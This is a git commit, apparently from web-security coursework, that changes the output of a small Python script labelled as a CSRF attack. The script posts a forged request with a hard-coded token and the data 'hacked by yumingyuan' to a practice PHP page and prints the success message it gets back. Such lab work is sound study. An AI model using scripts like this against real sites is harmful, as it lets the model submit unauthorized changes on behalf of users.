bab4c5cd0f42a378534608c42d16976494ff2c87
Yumingyuan <timdavid@vip.qq.com>
2019-05-22 13:33:42 +0800

    case09 CSRF attack

--- wsb/case09_CSRF.py
+++ wsb/case09_CSRF.py
@@ -4,5 +4,5 @@ url="http://www.wsb.com/Assignment2/case09.php"
 payload={"csrf_token":"wkjdb-iouer-234k3-wklu3k","data":"hacked by yumingyuan"}
 r=requests.post(url,data=payload)
 #print(r.text)
-print(re.findall("(Successful .*)<br/>(.*)<form",r.text))
-
+print("attack payload:",payload)
+print("attack result:"+re.findall("(Successful .*)<br/>(.*)<form",r.text)[0][0]+re.findall("(Successful .*)<br/>(.*)<form",r.text)[0][1])
